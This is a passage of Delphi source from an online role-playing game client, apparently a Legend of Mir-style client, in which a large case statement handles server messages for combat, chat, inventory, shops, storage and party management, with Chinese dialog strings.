                msg.Series {dir},
                0, 0, '', 0);
          End;
        End;

      SM_HIT, //14
      SM_HEAVYHIT, //15
      SM_POWERHIT, //18
      SM_LONGHIT, //19
      SM_WIDEHIT, //24
      SM_BIGHIT, //16
      SM_FIREHIT, //8
      SM_CRSHIT,
        SM_LONGSWORD1,
        SM_LONGSWORD2,
        SM_FIREHIT2,
        SM_LONGFIREHIT,
        SM_TWINHIT:
        Begin
          If msg.Recog <> g_MySelf.m_nRecogId Then
          Begin
            actor := PlayScene.FindActor(msg.Recog);
            If actor <> Nil Then
            Begin
              actor.SendMsg(msg.Ident,
                msg.Param {x},
                msg.tag {y},
                msg.Series {dir},
                0, 0, '',
                0);
              If msg.ident = SM_HEAVYHIT Then
              Begin
                If body <> '' Then
                  actor.m_boDigFragment := TRUE;
              End;
            End;
          End;
        End;
      SM_60,
        SM_61,
        SM_62,
        SM_SHOWEFFECT:
        Begin
          actor := PlayScene.FindActor(msg.Recog);
          If actor <> Nil Then
          Begin
            actor.SendMsg(msg.Ident,
              msg.Param {x},
              msg.tag {y},
              msg.Series {dir},
              0, 0, '',
              0);
            if msg.param=Effect_100 then
              PlaySound(s_click_drug);
          End;
        End;
      SM_FLYAXE:
        Begin
          DecodeBuffer(body, @mbw, sizeof(TMessageBodyW));
          actor := PlayScene.FindActor(msg.Recog);
          If actor <> Nil Then
          Begin
            actor.SendMsg(msg.Ident,
              msg.Param {x},
              msg.tag {y},
              msg.Series {dir},
              0, 0, '',
              0);
            actor.m_nTargetX := mbw.Param1; //x 带瘤绰 格钎
            actor.m_nTargetY := mbw.Param2; //y
            actor.m_nTargetRecog := MakeLong(mbw.Tag1, mbw.Tag2);
          End;
        End;

      SM_LIGHTING:
        Begin
          DecodeBuffer(body, @wl, sizeof(TMessageBodyWL));
          actor := PlayScene.FindActor(msg.Recog);
          If actor <> Nil Then
          Begin
            actor.SendMsg(msg.Ident,
              msg.Param {x},
              msg.tag {y},
              msg.Series {dir},
              0, 0, '',
              0);
            actor.m_nTargetX := wl.lParam1; //x 带瘤绰 格钎
            actor.m_nTargetY := wl.lParam2; //y
            actor.m_nTargetRecog := wl.lTag1;
            actor.m_nMagicNum := wl.lTag2; //付过 锅龋
          End;
        End;

      SM_SPELL:
        Begin
          UseMagicSpell(msg.Recog {who}, msg.Series {effectnum}, msg.Param {tx},
            msg.Tag {y}, Str_ToInt(body, 0));
        End;
      SM_MAGICFIRE:
        Begin
          DecodeBuffer(body, @param, sizeof(integer));
          UseMagicFire(msg.Recog {who}, Lobyte(msg.Series) {efftype},
            Hibyte(msg.Series) {effnum}, msg.Param {tx}, msg.Tag {y}, param);
          //Lobyte(msg.Series) = EffectType
          //Hibyte(msg.Series) = Effect
        End;
      SM_MAGICFIRE_FAIL:
        Begin
          UseMagicFireFail(msg.Recog);
        End;

      SM_OUTOFCONNECTION:
        Begin
          g_boDoFastFadeOut := FALSE;
          g_boDoFadeIn := FALSE;
          g_boDoFadeOut := FALSE;
          FrmDlg.DMessageDlg('服务器连接被强行中断。\' +
            '连接时间可能超过限制。\' +
            '或者用户请求重新连接。', [mbOk]);
          Close;
        End;

      SM_DEATH,
        SM_NOWDEATH:
        Begin
          DecodeBuffer(body, @desc, sizeof(TCharDesc));
          actor := PlayScene.FindActor(msg.Recog);
          If actor <> Nil Then
          Begin
            actor.SendMsg(msg.Ident,
              msg.param {x}, msg.Tag {y}, msg.Series {damage},
              desc.Feature, desc.Status, '',
              0);
            actor.m_Abil.HP := 0;
          End
          Else
          Begin
            PlayScene.SendMsg(SM_DEATH, msg.Recog, msg.param {x}, msg.Tag {y},
              msg.Series {damage}, desc.Feature, desc.Status, '');
          End;
        End;
      SM_SKELETON:
        Begin
          DecodeBuffer(body, @desc, sizeof(TCharDesc));
          PlayScene.SendMsg(SM_SKELETON, msg.Recog, msg.param {HP}, msg.Tag
            {maxHP}, msg.Series {damage}, desc.Feature, desc.Status, '');
        End;
      SM_ALIVE:
        Begin
          DecodeBuffer(body, @desc, sizeof(TCharDesc));
          PlayScene.SendMsg(SM_ALIVE, msg.Recog, msg.param {HP}, msg.Tag
            {maxHP}, msg.Series {damage}, desc.Feature, desc.Status, '');
        End;

      SM_ABILITY:
        Begin
          g_MySelf.m_nGold := msg.Recog;
          g_MySelf.m_btJob := msg.Param;
          g_MySelf.m_nGameGold := MakeLong(msg.Tag, msg.Series);
          DecodeBuffer(body, @g_MySelf.m_Abil, sizeof(TAbility));
        End;

      SM_SUBABILITY:
        Begin
          g_nMyHitPoint := Lobyte(Msg.Param);
          g_nMySpeedPoint := Hibyte(Msg.Param);
          g_nMyAntiPoison := Lobyte(Msg.Tag);
          g_nMyPoisonRecover := Hibyte(Msg.Tag);
          g_nMyHealthRecover := Lobyte(Msg.Series);
          g_nMySpellRecover := Hibyte(Msg.Series);
          g_nMyAntiMagic := LoByte(LongWord(Msg.Recog));
        End;

      SM_DAYCHANGING:
        Begin
          g_nDayBright := msg.Param;
          DarkLevel := msg.Tag;
          If DarkLevel = 0 Then
            g_boViewFog := FALSE
          Else
            g_boViewFog := TRUE;
        End;

      SM_WINEXP:
        Begin
          g_MySelf.m_Abil.Exp := msg.Recog; //坷弗 版氰摹
          //经验显示选择
          if (not g_WgInfo.boExpShowFil) or (g_WgInfo.boExpShowFil and (MakeLong(msg.Param, msg.Tag)>2000)) then
          If g_ExpShowConfig Then
            DScreen.AddChatBoardString(IntToStr(LongWord(MakeLong(msg.Param,
              msg.Tag))) + '点经验值增加.', clWhite, clRed)
          Else
            DScreen.AddHitMsg(IntToStr(LongWord(MakeLong(msg.Param, msg.Tag))) +
              ' 点经验值增加.');
        End;

      SM_LEVELUP:
        Begin
          g_MySelf.m_Abil.Level := msg.Param;
          DScreen.AddSysMsg('升级!');
          //DScreen.AddChatBoardString ('Congratulation! Your level is up. Your HP, MP are all recovered.',clWhite, clPurple);
        End;

      SM_HEALTHSPELLCHANGED:
        Begin
          Actor := PlayScene.FindActor(msg.Recog);
          If Actor <> Nil Then
          Begin
            With Actor Do
            Begin
              ClientGetMoveHMShow(Actor, msg.Param, msg.Tag);
              m_Abil.HP := msg.Param;
              m_Abil.MP := msg.Tag;
              m_Abil.MaxHP := msg.Series;
            End;
          End;
          If msg.Recog = g_HeronRecogId Then
          Begin
            g_HeroAbil.HP := msg.Param;
            g_HeroAbil.MP := msg.Tag;
            g_HeroAbil.MaxHP := msg.Series;
          End;
        End;

      SM_STRUCK:
        Begin
          //wl: TMessageBodyWL;

          DecodeBuffer(body, @wl, sizeof(TMessageBodyWL));
          Actor := PlayScene.FindActor(msg.Recog);
          If Actor <> Nil Then
          Begin
            If Actor = g_MySelf Then
            Begin
              If g_MySelf.m_nNameColor = 249 Then
                g_dwLatestStruckTick := GetTickCount;
            End
            Else
            Begin
              If Actor.CanCancelAction Then
                Actor.CancelAction;
            End;
            If (Not g_WgInfo.boDisableStruck) Or (Actor <> g_MySelf) Then
              Actor.UpdateMsg(SM_STRUCK, wl.lTag2, 0,
                {msg.Series}0, wl.lParam1, wl.lParam2,
                '', wl.lTag1);
            //DScreen.AddChatBoardString (Format('%d',[msg.Series]), GetRGB(255), GetRGB(0));
            ClientGetMonMoveHMShow(Actor, msg.param, msg.Tag, (msg.Series =
              10));
            Actor.m_Abil.HP := msg.param;
            Actor.m_Abil.MaxHP := msg.Tag;
          End;
          If msg.Recog = g_HeronRecogId Then
          Begin
            g_HeroAbil.HP := msg.param;
            g_HeroAbil.MaxHP := msg.Tag;
          End;
        End;

      SM_CHANGEFACE:
        Begin
          actor := PlayScene.FindActor(msg.Recog);
          If actor <> Nil Then
          Begin
            DecodeBuffer(body, @desc, sizeof(TCharDesc));
            actor.m_nWaitForRecogId := MakeLong(msg.Param, msg.Tag);
            actor.m_nWaitForFeature := desc.Feature;
            actor.m_nWaitForStatus := desc.Status;
            AddChangeFace(actor.m_nWaitForRecogId);
          End;
        End;
      SM_PASSWORD:
        Begin
          //PlayScene.EdChat.PasswordChar:='*';
          SetInputStatus();
        End;
      SM_OPENHEALTH:
        Begin
          actor := PlayScene.FindActor(msg.Recog);
          If actor <> Nil Then
          Begin
            If actor <> g_MySelf Then
            Begin
              actor.m_Abil.HP := msg.Param;
              actor.m_Abil.MaxHP := msg.Tag;
            End;
            actor.m_boOpenHealth := TRUE;
            //actor.OpenHealthTime := 999999999;
            //actor.OpenHealthStart := GetTickCount;
          End;
        End;
      SM_CLOSEHEALTH:
        Begin
          actor := PlayScene.FindActor(msg.Recog);
          If actor <> Nil Then
          Begin
            actor.m_boOpenHealth := FALSE;
          End;
        End;
      SM_INSTANCEHEALGUAGE:
        Begin
          actor := PlayScene.FindActor(msg.Recog);
          If actor <> Nil Then
          Begin
            actor.m_Abil.HP := msg.param;
            actor.m_Abil.MaxHP := msg.Tag;
            actor.m_noInstanceOpenHealth := TRUE;
            actor.m_dwOpenHealthTime := 2 * 1000;
            actor.m_dwOpenHealthStart := GetTickCount;
          End;
        End;

      SM_BREAKWEAPON:
        Begin
          actor := PlayScene.FindActor(msg.Recog);
          If actor <> Nil Then
          Begin
            If actor Is THumActor Then
              THumActor(actor).DoWeaponBreakEffect;
          End;
        End;

      SM_CRY,
        SM_GROUPMESSAGE, //   弊缝 皋技瘤
      SM_GUILDMESSAGE,
        SM_WHISPER,
        SM_SYSMESSAGE: //系统消息
        Begin
          If (Msg.Ident = SM_CRY) And (g_CloseCrcSys) Then
            exit;
          If (Msg.Ident = SM_WHISPER) And (g_CloseMySys) Then
            exit;
          If (Msg.Ident = SM_GUILDMESSAGE) And (g_CloseGuildSys) Then
            exit;
          str := DecodeString(body);
          If (msg.Ident = SM_SYSMESSAGE) Or (CheckBlockListSys(msg.Ident, str))
            Then
            DScreen.AddChatBoardString(str, GetRGB(Lobyte(msg.Param)),
              GetRGB(Hibyte(msg.Param)));
          If msg.Ident = SM_GUILDMESSAGE Then
            FrmDlg.AddGuildChat(str);
        End;

      SM_HEAR:
        Begin
          str := DecodeString(body);
          If (Not g_CloseAllSys) And (CheckBlockListSys(msg.Ident, str)) Then
            DScreen.AddChatBoardString(str, GetRGB(Lobyte(msg.Param)),
              GetRGB(Hibyte(msg.Param)));
          actor := PlayScene.FindActor(msg.Recog);
          If actor <> Nil Then
            actor.Say(str);
        End;

      SM_USERNAME:
        Begin
          str := DecodeString(body);
          actor := PlayScene.FindActor(msg.Recog);
          If actor <> Nil Then
          Begin
            CorpsIdx := GetValidStr3(str, str, ['|']);
            actor.m_sGroupMsg := GetValidStr3(CorpsIdx, CorpsIdx, ['|']);
            If actor.m_sGroupMsg <> '' Then
            Begin
              actor.m_sGroupMsg := AnsiReplaceText(actor.m_sGroupMsg, '\', '/');
              actor.m_sGroupMsg := AnsiReplaceText(actor.m_sGroupMsg, '|', '/');
            End;
            //sTemp:=GetValidStr3(CorpsIdx,CorpsIdx, ['/']);

            //actor.m_nUserCorpsIdx:=Str_ToInt(CorpsIdx,0);
            If CorpsIdx <> '' Then
            Begin
              CorpsIdx := GetValidStr3(CorpsIdx, sTemp, ['\']); //特殊图标
              actor.m_nUserCorpsIdx := Str_ToInt(sTemp, 0);
              If CorpsIdx <> '' Then
              Begin
                For i := Low(actor.m_nIconIdx) To High(actor.m_nIconIdx) Do
                Begin
                  CorpsIdx := GetValidStr3(CorpsIdx, sTemp, ['\']);
                  //特殊图标
                  actor.m_nIconIdx[i] := Str_ToInt(sTemp, 0);
                End;
                CorpsIdx := GetValidStr3(CorpsIdx, sTemp, ['\']);
                actor.m_nHelmet := Str_ToInt(sTemp, 0);
              End;
            End;
            actor.m_sDescUserName := GetValidStr3(str, actor.m_sUserName,
              ['\']);
            actor.m_nNameColor := GetRGB(msg.Param);
          End;
        End;
      SM_CHANGENAMECOLOR:
        Begin
          actor := PlayScene.FindActor(msg.Recog);
          If actor <> Nil Then
          Begin
            actor.m_nNameColor := GetRGB(msg.Param);
          End;
        End;

      SM_HIDE,
        SM_GHOST,
        SM_DISAPPEAR:
        Begin
          If g_MySelf.m_nRecogId <> msg.Recog Then
            PlayScene.SendMsg(SM_HIDE, msg.Recog, msg.Param {x}, msg.tag {y}, 0,
              0, 0, '');
        End;

      SM_DIGUP:
        Begin
          DecodeBuffer(body, @wl, sizeof(TMessageBodyWL));
          actor := PlayScene.FindActor(msg.Recog);
          If actor = Nil Then
            actor := PlayScene.NewActor(msg.Recog, msg.Param, msg.tag,
              msg.Series, wl.lParam1, wl.lParam2);
          actor.m_nCurrentEvent := wl.lTag1;
          actor.SendMsg(SM_DIGUP,
            msg.Param {x},
            msg.tag {y},
            msg.Series {dir + light},
            wl.lParam1,
            wl.lParam2, '', 0);
        End;
      SM_DIGDOWN:
        Begin
          PlayScene.SendMsg(SM_DIGDOWN, msg.Recog, msg.Param {x}, msg.tag {y},
            0, 0, 0, '');
        End;
      SM_SHOWEVENT:
        Begin
          DecodeBuffer(body, @smsg, sizeof(TShortMessage));
          event := TClEvent.Create(msg.Recog, Loword(msg.Tag) {x}, msg.Series
            {y}, msg.Param {e-type});
          event.m_nDir := 0;
          event.m_nEventParam := smsg.Ident;
          EventMan.AddEvent(event); //clvent啊 Free瞪 荐 乐澜
         if msg.Param=ET_FOUNTAIN then  
          PlaySoundEx(bmg_spring);
        End;
      SM_HIDEEVENT:
        Begin
          EventMan.DelEventById(msg.Recog);
        End;
      //Item ??
      SM_ADDITEM:
        Begin
          ClientGetAddItem(body,msg.Param);
        End;
      CM_UPDATEBAGITEM:
        Begin
          ClientGetBabInfoChange(msg.Recog, msg.Param, msg.Tag, Body);
        End;
      SM_BAGITEMS:
        Begin
          ClientGetBagItmes(body);
        End;
      SM_TAKEONITEM: ClientTakeOnItem(Msg.Recog, msg.Param, (msg.Series = 1),
          Body);
      SM_TAKEOFFITEM: ClientTakeOffItem(Msg.Recog, msg.Param, Body);

      SM_TAXISLIST:
        Begin
          ClientGetTaxisList(Msg.Recog, msg.Param, Msg.Tag, Body);
        End;
      SM_SELLOFFLIST:
        Begin
          ClientGetSellList(Msg.Recog, msg.Param, Msg.Tag, Msg.Series, Body);
        End;
      SM_UPDATEITEM:
        Begin
          ClientGetUpdateItem(body);
        End;
      SM_DELITEM:
        Begin
          ClientGetDelItem(body);
        End;
      SM_DELITEMS:
        Begin
          ClientGetDelItems(body);
        End;

      SM_DROPITEM_SUCCESS:
        Begin
          DelDropItem(DecodeString(body), msg.Recog);
        End;
      SM_DROPITEM_FAIL:
        Begin
          ClientGetDropItemFail(DecodeString(body), msg.Recog);
        End;
      SM_DIAMONDGIRD: ClientGetDiamondGird(Msg.Recog, MakeLong(Msg.Param,
          Msg.Tag));

      SM_ITEMSHOW: ClientGetShowItem(msg.Recog, msg.param {x}, msg.Tag {y},
          msg.Series {looks}, DecodeString(body));
      SM_ITEMHIDE: ClientGetHideItem(msg.Recog, msg.param, msg.Tag);
      SM_OPENDOOR_OK: Map.OpenDoor(msg.param, msg.tag);
      SM_OPENDOOR_LOCK: DScreen.AddSysMsg('门被锁住了.');
      SM_CLOSEDOOR: Map.CloseDoor(msg.param, msg.tag);

      SM_TAKEON_OK:
        Begin
          g_MySelf.m_nFeature := msg.Recog;
          g_MySelf.FeatureChanged;
          //            if WaitingUseItem.Index in [0..8] then
          If g_WaitingUseItem.Index In [0..MAXUSEITEMS] Then
            g_UseItems[g_WaitingUseItem.Index] := g_WaitingUseItem.Item;
          g_WaitingUseItem.Item.S.Name := '';
        End;
      SM_TAKEON_FAIL:
        Begin
          AddItemBag(g_WaitingUseItem.Item);
          g_WaitingUseItem.Item.S.Name := '';
        End;
      SM_TAKEOFF_OK:
        Begin
          g_MySelf.m_nFeature := msg.Recog;
          g_MySelf.FeatureChanged;
          g_WaitingUseItem.Item.S.Name := '';
        End;
      SM_TAKEOFF_FAIL:
        Begin
          If g_WaitingUseItem.Index < 0 Then
          Begin
            n := -(g_WaitingUseItem.Index + 1);
            g_UseItems[n] := g_WaitingUseItem.Item;
          End;
          g_WaitingUseItem.Item.S.Name := '';
        End;
      SM_EXCHGTAKEON_OK: ;
      SM_EXCHGTAKEON_FAIL: ;

      {SM_OPENARK_OK:
         begin
            FrmDlg.DOpenArk.Visible:=False;
            g_OpenArkItem.S.Name:='';
            g_OpenArkKeyItem.S.Name:='';
            DScreen.AddChatBoardString('打开宝箱成功。',clWhite,clRed);
         end;
      SM_OPENARK_FAIL:
         begin
            FrmDlg.DArkCloseClick(nil,0,0);
            DScreen.AddChatBoardString('打开宝箱失败。',clRed,clWhite);
         end; }
      SM_OPENARK_ITEM:
        Begin
          ClientGetBoxsItmes(body);
        End;
      SM_OPENARK_ITEM2:
        Begin
          ClientGetBoxsItmes2(body);
        End;
      SM_OPENARK_MOVE:
        Begin
          FrmDlg.m_nOpenMoveGold := msg.Recog;
          FrmDlg.m_nOpenMoveGameGold := MakeLong(msg.Param, msg.Tag);
          FrmDlg.m_nOpenEndIdx := msg.Series;
        End;

      SM_LEVELITEM_OK:
        Begin
          PlaySoundEx(bmg_Openbox);
          FrmDlg.m_nLevelIdx := 0;
          ClientGetLevelItms(msg.Recog, body);
        End;
      SM_LEVELITEM_FAIL:
        Begin
          Case msg.Recog Of
            0:
              FrmDlg.DMessageDlg('[失败]：未找到升级装备或未知错误。', [mbOk]);
            1: FrmDlg.DMessageDlg('[失败]：该装备不允许升级。',
                [mbOK]);
            2:
              FrmDlg.DMessageDlg('[失败]：升级装备与宝石不符合规则。', [mbOK]);
          End;
        End;

      SM_SENDUSEITEMS:
        Begin
          ClientGetSenduseItems(body);
        End;
      SM_WEIGHTCHANGED:
        Begin
          g_MySelf.m_Abil.Weight := msg.Recog;
          g_MySelf.m_Abil.WearWeight := msg.Param;
          g_MySelf.m_Abil.HandWeight := msg.Tag;
        End;
      SM_GOLDCHANGED:
        Begin
          SoundUtil.PlaySound(s_money);
          If msg.Recog > g_MySelf.m_nGold Then
          Begin
            DScreen.AddSysMsg(IntToStr(msg.Recog - g_MySelf.m_nGold) + ' ' +
              g_sGoldName + '增加.');
          End;
          g_MySelf.m_nGold := msg.Recog;
          g_MySelf.m_nGameGold := MakeLong(msg.Param, msg.Tag);
        End;
      SM_FEATURECHANGED:
        Begin
          PlayScene.SendMsg(msg.Ident, msg.Recog, 0, 0, 0, MakeLong(msg.Param,
            msg.Tag), MakeLong(msg.Series, 0), '');
        End;
      SM_CHARSTATUSCHANGED:
        Begin
          PlayScene.SendMsg(msg.Ident, msg.Recog, 0, 0, 0, MakeLong(msg.Param,
            msg.Tag), msg.Series, '');
        End;
      SM_CLEAROBJECTS:
        Begin
          PlayScene.CleanObjects;
          g_boMapMoving := TRUE; //
        End;

      SM_EAT_OK:
        Begin
          g_EatingItem.S.Name := '';
          ArrangeItembag;
        End;

      SM_Gotonow:
        Begin
         g_nMiniMapPath := FindPath(msg.Recog,msg.Param);
         if High(g_nMiniMapPath) > 2 then
         begin
           g_boAutoMoveing := True;
           DScreen.AddChatBoardString(Format('自动移动至坐标(%d,%d)，点击鼠标或按Ctrl+Z键停止!',[msg.Recog,msg.Param]),GetRGB(180), clWhite);
         end;
        End;

      SM_ChangeSKILL:
      begin
        ClientChangeMagic(msg.Recog,body);
      end;

      SM_HeroChangeSKILL:
      begin
        ClientHeroChangeMagic(msg.Recog,body);
      end;

      SM_EAT_FAIL:
        Begin
          AddItemBag(g_EatingItem);
          g_EatingItem.S.Name := '';
        End;

      SM_ADDMAGIC:
        Begin
          If body <> '' Then
            ClientGetAddMagic(body);
        End;
      SM_SENDMYMAGIC:
        Begin
          g_OpenAd := Msg.Recog = 1;
          If body <> '' Then
            ClientGetMyMagics(body);
        End;
      SM_DELMAGIC:
        Begin
          ClientGetDelMagic(msg.Recog);
        End;
      SM_MAGIC_LVEXP:
        Begin
          ClientGetMagicLvExp(msg.Recog {magid}, msg.Param {lv},
            MakeLong(msg.Tag, msg.Series));
        End;
      SM_BAG_DURACHANGE:
        Begin
          ClientGetBabDuraChange(Msg.Recog, Msg.Param, Msg.Tag);
        End;
      SM_DURACHANGE:
        Begin
          ClientGetDuraChange(msg.Param {useitem index}, msg.Recog,
            MakeLong(msg.Tag, msg.Series));
        End;

      SM_MERCHANTSAY:
        Begin
          ClientGetMerchantSay(msg.Recog, msg.Param, DecodeString(body));
        End;
      SM_MERCHANTDLGCLOSE:
        Begin
          FrmDlg.CloseMDlg;
        End;
      SM_SENDGOODSLIST:
        Begin
          ClientGetSendGoodsList(msg.Recog, msg.Param, body);
        End;
      SM_SENDUSERMAKEDRUGITEMLIST:
        Begin
          ClientGetSendMakeDrugList(msg.Recog, body);
        End;
      SM_SENDUSERSELL:
        Begin
          ClientGetSendUserSell(msg.Recog, msg.Param);
        End;
      SM_SENDUSERREPAIR:
        Begin
          ClientGetSendUserRepair(msg.Recog);
        End;
      SM_SENDBUYPRICE:
        Begin
          If g_SellDlgItem2.S.Name <> '' Then
          Begin
            If msg.Recog > 0 Then
              g_sSellPriceStr := IntToStr(msg.Recog) + ' ' + g_sGoldName
                {金币'}
            Else
              g_sSellPriceStr := '???? ' + g_sGoldName {金币'};
          End;
        End;
      SM_USERSELLITEM_OK:
        Begin
          FrmDlg.LastestClickTime := GetTickCount;
          g_MySelf.m_nGold := msg.Recog;
          g_SellDlgItemSellWait.S.Name := '';
        End;

      SM_USERSELLITEM_FAIL:
        Begin
          FrmDlg.LastestClickTime := GetTickCount;
          AddItemBag(g_SellDlgItemSellWait);
          g_SellDlgItemSellWait.S.Name := '';
          Case Msg.Recog Of
            -1:
              FrmDlg.DMessageDlg(Format('输入的价格不能小于1或大于%d。', [High(Integer)]), [mbOk]);
            -2: FrmDlg.DMessageDlg('物品不存在。', [mbOk]);
            -3: FrmDlg.DMessageDlg('物品不存在。', [mbOk]);
            -4: FrmDlg.DMessageDlg('该物品不允许寄售。', [mbOk]);
          Else
            FrmDlg.DMessageDlg('你不能出售该物品。', [mbOk]);
          End;
        End;
      SM_SELLOFFITEM_OK:
        Begin
          FrmDlg.LastestClickTime := GetTickCount;
          g_SellDlgItemSellWait.S.Name := '';
        End;
      SM_SELLOFFITEM_FAIL:
        Begin
          FrmDlg.LastestClickTime := GetTickCount;
          AddItemBag(g_SellDlgItemSellWait);
          g_SellDlgItemSellWait.S.Name := '';
          Case Msg.Recog Of
            0: FrmDlg.DMessageDlg('物品不存在。', [mbOk]);
            1: FrmDlg.DMessageDlg('该物品不允许寄售。', [mbOk]);
          Else
            FrmDlg.DMessageDlg('物品不存在。', [mbOk]);
          End;
        End;
      SM_SELLOFFITEMBUY_FAIL:
        Begin
          Case Msg.Recog Of
            0:
              FrmDlg.DMessageDlg('[失败]：物品不存在，或已经被出售',
                [mbOk]);
            1: FrmDlg.DMessageDlg('[失败]：你的金币或元宝不够！',
                [mbOk]);
            2:
              FrmDlg.DMessageDlg('[失败]：你的背包无法携带更多的物品。', [mbOk]);
          End;
        End;

      SM_SENDREPAIRCOST:
        Begin
          If g_SellDlgItem2.S.Name <> '' Then
          Begin
            If msg.Recog >= 0 Then
              g_sSellPriceStr := IntToStr(msg.Recog) + ' ' + g_sGoldName {金币}
            Else
              g_sSellPriceStr := '???? ' + g_sGoldName {金币};
          End;
        End;
      SM_USERREPAIRITEM_OK:
        Begin
          If g_SellDlgItemSellWait.S.Name <> '' Then
          Begin
            FrmDlg.LastestClickTime := GetTickCount;
            g_MySelf.m_nGold := msg.Recog;
            g_SellDlgItemSellWait.Dura := msg.Param;
            g_SellDlgItemSellWait.DuraMax := msg.Tag;
            AddItemBag(g_SellDlgItemSellWait);
            g_SellDlgItemSellWait.S.Name := '';
          End;
        End;
      SM_USERREPAIRITEM_FAIL:
        Begin
          FrmDlg.LastestClickTime := GetTickCount;
          AddItemBag(g_SellDlgItemSellWait);
          g_SellDlgItemSellWait.S.Name := '';
          FrmDlg.DMessageDlg('你不能修理这个物品.', [mbOk]);
        End;
      SM_STORAGE_OK,
        SM_STORAGE_FULL,
        SM_STORAGE_FAIL:
        Begin
          FrmDlg.LastestClickTime := GetTickCount;
          If msg.Ident <> SM_STORAGE_OK Then
          Begin
            If msg.Ident = SM_STORAGE_FULL Then
              FrmDlg.DMessageDlg('您的个人仓库已满. 您不能再寄存任何东西.', [mbOk])
            Else
              FrmDlg.DMessageDlg('你不能寄存.', [mbOk]);
            AddItemBag(g_SellDlgItemSellWait);
          End;
          g_SellDlgItemSellWait.S.Name := '';
        End;
      SM_SAVEITEMLIST:
        Begin
          If msg.Param = 1 Then
            ClientGetSaveItemList2(msg.Recog, body)
          Else
            ClientGetSaveItemList(msg.Recog, body);
        End;
      SM_TAKEBACKSTORAGEITEM_OK,
        SM_TAKEBACKSTORAGEITEM_FAIL,
        SM_TAKEBACKSTORAGEITEM_FULLBAG:
        Begin
          FrmDlg.LastestClickTime := GetTickCount;
          If msg.Ident <> SM_TAKEBACKSTORAGEITEM_OK Then
          Begin
            If msg.Ident = SM_TAKEBACKSTORAGEITEM_FULLBAG Then
              FrmDlg.DMessageDlg('你不能携带更多的东西了.', [mbOk])
            Else
              FrmDlg.DMessageDlg('你不能取回.', [mbOk]);
          End
          Else
            FrmDlg.DelStorageItem(msg.Recog); //itemserverindex
        End;

      SM_BUYITEM_SUCCESS:
        Begin
          FrmDlg.LastestClickTime := GetTickCount;
          g_MySelf.m_nGold := msg.Recog;
          FrmDlg.SoldOutGoods(MakeLong(msg.Param, msg.Tag));
          //迫赴 酒捞袍 皋春俊辑 画
        End;
      SM_BUYITEM_FAIL:
        Begin
          FrmDlg.LastestClickTime := GetTickCount;
          Case msg.Recog Of
            1: FrmDlg.DMessageDlg('物品被卖出.', [mbOk]);
            2: FrmDlg.DMessageDlg('没有更多的物品可以携带了.',
                [mbOk]);
            3: FrmDlg.DMessageDlg(g_sGoldName {'金币'} + '不足.', [mbOk]);
          End;
        End;
      SM_MAKEDRUG_SUCCESS:
        Begin
          FrmDlg.LastestClickTime := GetTickCount;
          g_MySelf.m_nGold := msg.Recog;
          FrmDlg.DMessageDlg('物品已经被正确打造', [mbOk]);
        End;
      SM_MAKEDRUG_FAIL:
        Begin
          FrmDlg.LastestClickTime := GetTickCount;
          Case msg.Recog Of
            1: FrmDlg.DMessageDlg('发生了错误.', [mbOk]);
            2: FrmDlg.DMessageDlg('没有更多的物品可以携带了.',
                [mbOk]);
            3: FrmDlg.DMessageDlg(g_sGoldName {'金币'} + '不足.', [mbOk]);
            4: FrmDlg.DMessageDlg('你缺乏所必需的物品。', [mbOk]);
          End;
        End;
      SM_716:
        Begin
          DrawEffectHum(Msg.Series {type}, Msg.Param {x}, Msg.Tag {y});
        End;
      SM_SENDDETAILGOODSLIST:
        Begin
          ClientGetSendDetailGoodsList(msg.Recog, msg.Param, msg.Tag, body);
        End;
      SM_TEST:
        Begin
          Inc(g_nTestReceiveCount);
        End;

      SM_SENDNOTICE:
        Begin

{$IF TOOLVER = DEFVER} //
          If (msg.Recog = 2) And (msg.Param = 2) And (msg.Tag = 2) And
            (msg.Series = 2) Then
          Begin
            ClientGetSendNotice(body);
{$ELSE}
            If (msg.Recog = 1) And (msg.Param = 1) And (msg.Tag = 1) And
              (msg.Series = 1) Then
            Begin
              ClientGetSendNotice(body);
{$IFEND}
            End
            Else
            Begin
              g_boDoFastFadeOut := FALSE;
              FrmDlg.DMessageDlg('连接中断。\' +
                '客户端程序与服务端不配套，\' +
                '请提醒管理员更新服务端程序.\', [mbOk]);
              FrmMain.Close;
            End;
          End;
          SM_GROUPMODECHANGED: //辑滚俊辑 唱狼 弊缝 汲沥捞 函版登菌澜.
          Begin
            If msg.Param > 0 Then
              g_boAllowGroup := TRUE
            Else
              g_boAllowGroup := FALSE;
            g_dwChangeGroupModeTick := GetTickCount;
          End;
          SM_CREATEGROUP_OK:
          Begin
            g_dwChangeGroupModeTick := GetTickCount;
            g_boAllowGroup := TRUE;
            {GroupMembers.Add (Myself.UserName);
            GroupMembers.Add (DecodeString(body));}
          End;
          SM_CREATEGROUP_FAIL:
          Begin
            g_dwChangeGroupModeTick := GetTickCount;
            Case msg.Recog Of
              -1: FrmDlg.DMessageDlg('已经加入编组.', [mbOk]);
              -2:
                FrmDlg.DMessageDlg('这个被加进编组的名字是不正确的.', [mbOk]);
              -3:
                FrmDlg.DMessageDlg('你想加进编组的这位用户已经是其它编组的成员了.', [mbOk]);
              -4: FrmDlg.DMessageDlg('对方不允许编组.', [mbOk]);
            End;
          End;
          SM_GROUPADDMEM_OK:
          Begin
            g_dwChangeGroupModeTick := GetTickCount;
            //GroupMembers.Add (DecodeString(body));
          End;
          SM_GROUPADDMEM_FAIL:
          Begin
            g_dwChangeGroupModeTick := GetTickCount;
            Case msg.Recog Of
              -1:
                FrmDlg.DMessageDlg('编组还未成立或者您还不够等级创建.', [mbOk]);
              -2:
                FrmDlg.DMessageDlg('这个被加进编组的名字是不正确的.', [mbOk]);
              -3: FrmDlg.DMessageDlg('已经加入编组.', [mbOk]);
              -4: FrmDlg.DMessageDlg('对方不允许编组.', [mbOk]);
              -5: FrmDlg.DMessageDlg('成员已达上限！', [mbOk]);
            End;
          End;
          SM_GROUPDELMEM_OK:
          Begin
            g_dwChangeGroupModeTick := GetTickCount;
            {data := DecodeString (body);
            for i:=0 to GroupMembers.Count-1 do begin
               if GroupMembers[i] = data then begin
                  GroupMembers.Delete (i);
                  break;
               end;
            end; }
          End;
          SM_GROUPDELMEM_FAIL:
          Begin
            g_dwChangeGroupModeTick := GetTickCount;
            Case msg.Recog Of
              -1:
                FrmDlg.DMessageDlg('编组还未成立或者您还不够等级创建。', [mbOk]);
              -2:
                FrmDlg.DMessageDlg('这个被加进编组的名字是不正确的。', [mbOk]);
              -3: FrmDlg.DMessageDlg('你仍旧不在编组中。', [mbOk]);
            End;
          End;
          SM_GROUPCANCEL:
          Begin
            g_GroupMembers.Clear;
          End;
